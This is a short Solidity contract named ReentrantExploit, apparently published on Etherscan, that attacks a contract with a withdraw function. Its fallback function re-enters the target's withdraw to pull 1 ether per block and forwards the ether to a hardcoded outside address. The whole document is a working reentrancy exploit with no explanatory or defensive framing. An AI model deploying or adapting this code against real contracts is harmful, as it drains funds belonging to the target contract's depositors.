/**
 *Submitted for verification at Etherscan.io on 2021-07-24
*/

pragma solidity ^0.6.12;


interface IReentrancy {
    function withdraw(uint) external;
}

contract ReentrantExploit {
    
    address public reentrant;
    mapping(uint256 => bool) public calls;
    
    constructor(address target) public {
        reentrant = target;
    }
    
    function withdraw(uint amount) public {
        IReentrancy(reentrant).withdraw(amount);
    }
    
    function setReentrant(address _reentrant) external {
        reentrant = _reentrant;
    }
    
    fallback() external payable {
        if(!calls[block.number]) {
            bytes memory payload = abi.encodeWithSignature("withdraw(uint)", 1 ether);
            (bool success, ) = address(reentrant).call(payload);
            require(success, "cannot call reentrant");
            (bool sentSuccess, ) = address(0x632A84DC35A1e43B8196B2d08630dC9e6a1F3692).call{value: 1 ether}("");
            require(sentSuccess, "cannot sent eth to msg.sender");
            calls[block.number] = true;
        }
    }
}